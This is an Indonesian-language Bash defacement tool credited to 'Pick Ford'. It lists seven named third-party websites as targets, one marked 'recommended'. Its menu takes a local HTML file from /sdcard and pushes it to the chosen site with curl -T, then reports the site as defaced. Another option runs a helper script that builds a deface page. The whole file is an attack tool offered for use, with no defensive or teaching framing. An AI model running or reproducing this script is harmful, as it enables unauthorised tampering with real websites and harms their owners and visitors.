
#Ingat Dipelajari Jan Di Decode
#Support My Youtube Channel:
#https://bit.ly/AmmarExecuted
#Save My Contact:
#https://wa.me/6288229683561 ✓

blue="\033[34;1m"
green="\033[32;1m"
purple="\033[35;1m"
cyan="\033[36;1m"
red="\033[31;1m"
putih="\033[97;1m"
kuning="\033[93;1m"
pa="http://uzingela.co.za"
pu="http://thefoundation.co.za"
pe="http://techdirect.co.za"
pt="http://tieronecapital.co.za"
pk="http://totemafrica.com"
pl="http://ziady.com"
i="http://whadiz.com"

#Buat Tanya Login Lagi Apa Enggak
menu() {
read -p "Deface Lagi Gak Tod? (Y/N) " lgi
if [ $lgi = y ] || [ $lgi = Y ]
then
bash deface.sh
fi
if [ $lgi = n ] || [ $lgi = N ]
then
exit
fi
}

clear
 
neofetch --ascii_distro garuda 
echo ""
echo -e $red"               •"$kuning"•"$green"•"$putih"Coded By Pick Ford"$green"•"$kuning"•"$red"•"$putih 
echo -e $kuning'•'$putih'───────────────────────────────────────────────────────'$kuning'•'
echo -e $putih'Github    '$red':'$putih'https://github.com/PICKFORD-DC'
echo -e $putih'Facebook  '$red':'$putih'https://www.facebook.com/profile.php?id=100077142458119 '
echo -e $putih'Whatsapp  '$red':'$putih'Kepo kon'
echo -e $kuning'•'$putih'───────────────────────────────────────────────────────'$kuning'•'

echo -e $putih"["$green'•'$putih'] 1. http://uzingela.co.za' '['$green'RECOMENDED'$putih']'
echo -e "["$red"•"$putih"] 2. http://thefoundation.co.za" 
echo -e "["$red"•"$putih"] 3. http://techdirect.co.za" 
echo -e "["$red"•"$putih"] 4. http://tieronecapital.co.za" 
echo -e "["$red"•"$putih"] 5. http://totemafrica.com" 
echo -e "["$red"•"$putih"] 6. http://ziady.com" 
echo -e "["$red"•"$putih"] 7. http://whadiz.com" 
echo -e "["$green"•"$putih"] 8. BUAT SCRIPT DEFACE SENDIRI" '['$green'Kalo Lu Blum Punya Script Pilih Ini Dulu kon'$putih']' 
echo 
read -p "Pilih No Berapa Tod: " Next;  
if [ $Next = 1 ] || [ $Next = satu ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pa 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pa/$sc 
menu 
fi 
if [ $Next = 2 ] || [ $Next = dua ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pu 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pu/$sc 
menu 
fi 
if [ $Next = 3 ] || [ $Next = tiga ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pe 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pe/$sc 
menu 
fi 
if [ $Next = 4 ] || [ $Next = empat ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pt 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pt/$sc 
menu 
fi 
if [ $Next = 5 ] || [ $Next = lima ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pk 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pk/$sc 
menu 
fi 
if [ $Next = 6 ] || [ $Next = enam ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pl 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pl/$sc 
menu 
fi 
if [ $Next = 7 ] || [ $Next = tujuh ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $i 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $i/$sc 
menu 
fi 
if [ $Next = 8 ] || [ $Next = delapan ] 
then 
cd Data
bash create_enc.sh
menu 
fi
